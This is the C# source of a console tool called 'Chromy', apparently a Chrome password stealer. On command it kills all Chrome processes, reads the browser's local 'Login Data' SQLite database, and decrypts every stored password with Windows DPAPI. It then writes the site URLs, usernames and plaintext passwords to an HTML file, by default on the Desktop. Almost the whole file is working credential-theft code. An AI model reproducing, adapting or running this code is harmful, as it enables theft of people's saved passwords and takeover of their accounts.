using Chromy.core;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace Chromy
{
    class Program
    {
        static void Main(string[] args)
        {
            // Set Header
            PrintMe.PrintHeader();

            #region Load
            Console.Write("                               Performing some task... ");
            using (var progress = new ProgressBar())
            {
                for (int i = 0; i <= 100; i++)
                {
                    progress.Report((double)i / 100);
                    Thread.Sleep(10);
                }
            }
            Console.WriteLine("Done. Type 'help' for help.");
            #endregion

            while(true)
            // Read Command
            ReadCommand();

            Console.ReadLine();
        }

        private static string ReadCommand()
        {

            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n$> ");
            var cmd = Console.ReadLine().ToLower();

            if(cmd == "help")
            {
                PrintMe.PrintHelp();
            }
            if (cmd == "dump" && !cmd.Contains("-p"))
            {
                Decrypt("");

                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("\n$> DUMP DONE!");
                Console.ForegroundColor = ConsoleColor.Red;
            }
            if (cmd.Contains("dump -p") && !cmd.Contains("-d"))
            {
                var spath = cmd.Split('-');

                // remove 'p'
                spath[1] = spath[1].Remove(0, 1);

                Decrypt(spath[1]);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("\n$> DUMP DONE!");
                Console.ForegroundColor = ConsoleColor.Red;
            }
            if (cmd.Contains("dump -d") && !cmd.Contains("-p"))
            {
                Decrypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("\n$> DUMP DONE!");
                Console.ForegroundColor = ConsoleColor.Red;
            }

            return null; 
        }

        private static void KillChrome()
        {
            var chromeInstances = Process.GetProcessesByName("chrome");

            foreach (Process p in chromeInstances)
                p.Kill();
        }

        private static bool Decrypt(string path)
        {
            try
            {
                Console.WriteLine("$> Killing Chrome");
                KillChrome();
                path += "ChromyDump.html";
                StreamWriter Writer = new StreamWriter(path, false, Encoding.UTF8);
                string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                    + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
                Console.WriteLine("$> DB file = " + db_way);

                string db_field = "logins";   // DB table field name
                byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
                string description;    // I could not understand the purpose of a this mandatory parameter
                                       // Output always is Null
                                       // Connect to DB

                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                DataTable DB = new DataTable();
                string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");

                // for better closing use using key
                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                {
                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(DB);
                    int rows = DB.Rows.Count;
                    for (int i = 0; i < rows; i++)
                    {
                        Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
                        Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
                        Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
                                                                  // Here the password description
                        byte[] byteArray = (byte[])DB.Rows[i][5];
                        byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                        string password = new UTF8Encoding(true).GetString(decrypted);
                        Writer.WriteLine(password + "<br><br>");
                    }
                }

                Writer.Close();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                ex = ex.InnerException;
                return false;
            }
        }
    }
}

